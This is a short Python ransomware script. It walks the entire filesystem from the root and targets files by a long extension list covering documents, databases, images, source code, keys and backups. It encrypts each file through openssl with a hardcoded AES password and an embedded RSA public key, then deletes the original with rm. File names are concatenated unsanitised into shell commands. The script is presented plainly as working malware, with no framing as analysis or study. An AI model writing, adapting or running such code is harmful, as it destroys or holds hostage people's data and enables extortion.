import os,sys

aes_password="ricardo"
pkeyname="public.pem"
extensions=['123', 'jpeg', 'rb', '602', 'jpg', 'rtf', 'doc', 'js', 'sch', '3dm', 'jsp', 'sh', '3ds', 'key', 'sldm', '3g2', 'lay', 'sldm', '3gp', 'lay6', 'sldx', '7z', 'ldf', 'slk', 'accdb', 'm3u', 'sln', 'aes', 'm4u', 'snt', 'ai', 'max', 'sql', 'ARC', 'mdb', 'sqlite3', 'asc', 'mdf', 'sqlitedb', 'asf', 'mid', 'stc', 'asm', 'mkv', 'std', 'asp', 'mml', 'sti', 'avi', 'mov', 'stw', 'backup', 'mp3', 'suo', 'bak', 'mp4', 'svg', 'bat', 'mpeg', 'swf', 'bmp', 'mpg', 'sxc', 'brd', 'msg', 'sxd', 'bz2', 'myd', 'sxi', 'c', 'myi', 'sxm', 'cgm', 'nef', 'sxw', 'class', 'odb', 'tar', 'cmd', 'odg', 'tbk', 'cpp', 'odp', 'tgz', 'crt', 'ods', 'tif', 'cs', 'odt', 'tiff', 'csr', 'onetoc2', 'txt', 'csv', 'ost', 'uop', 'db', 'otg', 'uot', 'dbf', 'otp', 'vb', 'dch', 'ots', 'vbs', 'der\xe2\x80\x9d', 'ott', 'vcd', 'dif', 'p12', 'vdi', 'dip', 'PAQ', 'vmdk', 'djvu', 'pas', 'vmx', 'docb', 'pdf', 'vob', 'docm', 'vsd', 'docx', 'pfx', 'vsdx', 'dot', 'php', 'wav', 'dotm', 'pl', 'wb2', 'dotx', 'png', 'wk1', 'dwg', 'pot', 'wks', 'edb', 'potm', 'wma', 'eml', 'potx', 'wmv', 'fla', 'ppam', 'xlc', 'flv', 'pps', 'xlm', 'frm', 'ppsm', 'xls', 'gif', 'ppsx', 'xlsb', 'gpg', 'ppt', 'xlsm', 'gz', 'pptm', 'xlsx', 'h', 'pptx', 'xlt', 'hwp', 'ps1', 'xltm', 'ibd', 'psd', 'xltx', 'iso', 'pst', 'xlw', 'jar', 'rar', 'zip', 'java', 'raw']

def create_key():
	f= open(pkeyname,"w+")
	f.write('-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtS5K6YGROGa01x8HhPo2\nkaKn+Gme3ihCI7dieh09iaAphXbjhNsKuE309J8nFZKecuImfQt8bERmerd9ndom\nmIQfJSY9iCzhEOhL5xsSOfqEzFaYBTcRdpgKNQBwk7BCsRjSuN8MPvuwaPKG9FxF\nTOo5lEGz+lFUlhKeVk8YFl8KQCr7RNleQ4I+ZHp/3qWWNlD5CGY5O7h7H2j6Ylgw\nDSCmx4yO0xVEV0OHAZkyM4zZzay03/bfYpcnmWUrN2nWlRfHQ6h1uIjjCo5Xafmr\n6veSASe95V+9uU9FOGFrJggDQSX9zLzJfzUoqla429Zd6D4h2zIf0Oyu7srxRBQx\nIQIDAQAB\n-----END PUBLIC KEY-----\n')
	f.close()


def encrypt_(fname):
	os.system("openssl aes-256-cbc -pass pass:"+aes_password+" -in "+fname+" -out "+fname+".aes")
	os.system("openssl rsautl -encrypt -pubin -inkey "+pkeyname+" -in "+fname+".aes -out "+fname+".rsa 2>/dev/null")
	os.system("openssl aes-256-cbc -pass pass:"+aes_password+" -in "+fname+".rsa -out "+fname+".enc")
	os.system("rm "+fname+".aes")
	os.system("rm "+fname+".rsa")
	os.system("rm "+fname)


def enc_files(dir_):
	try:
		onlyfiles = [f for f in os.listdir(dir_) if os.path.isfile(os.path.join(dir_, f))]
		for f in onlyfiles:
			splitted=f.split(".")
			if len(splitted)>=2:
				if f.split(".")[1] in extensions:
					file=os.path.join(dir_, f)
					#print "Encrypting",file,"..."
					encrypt_(file)
	except:
		pass

def loop(looped_dir):
	#Files in the root dir
	enc_files(looped_dir)
	#Directories inside
	for root,directories,filenames in os.walk(looped_dir):
		for directory in directories:
			dir=os.path.join(root, directory)
			#print "Entering",dir,"..."
			enc_files(dir)


def main():
	create_key()
	loop("/")
	os.system("rm "+pkeyname)

if __name__== "__main__":
  main()
